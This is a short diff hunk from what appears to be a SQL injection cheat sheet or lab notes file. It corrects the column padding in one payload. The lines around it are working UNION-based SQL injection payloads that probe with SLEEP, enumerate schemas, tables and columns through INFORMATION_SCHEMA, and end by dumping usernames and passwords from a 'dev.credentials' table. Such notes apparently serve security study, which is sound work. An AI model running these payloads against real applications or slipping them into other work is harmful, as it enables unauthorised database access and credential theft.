@@ -613,7 +613,7 @@ SELECT SLEEP(5)
 SELECT * FROM my_database.users;
 SELECT SCHEMA_NAME FROM INFORMATION_SCHEMA.SCHEMATA;
 cn' UNION select 1,schema_name,3,4 from INFORMATION_SCHEMA.SCHEMATA-- -
-cn' UNION select 1,database(),2,3-- -
+cn' UNION select 1,database(),3,4-- -
 cn' UNION select 1,TABLE_NAME,TABLE_SCHEMA,4 from INFORMATION_SCHEMA.TABLES where table_schema='dev'-- -
 cn' UNION select 1,COLUMN_NAME,TABLE_NAME,TABLE_SCHEMA from INFORMATION_SCHEMA.COLUMNS where table_name='credentials'-- -
 cn' UNION select 1, username, password, 4 from dev.credentials-- -
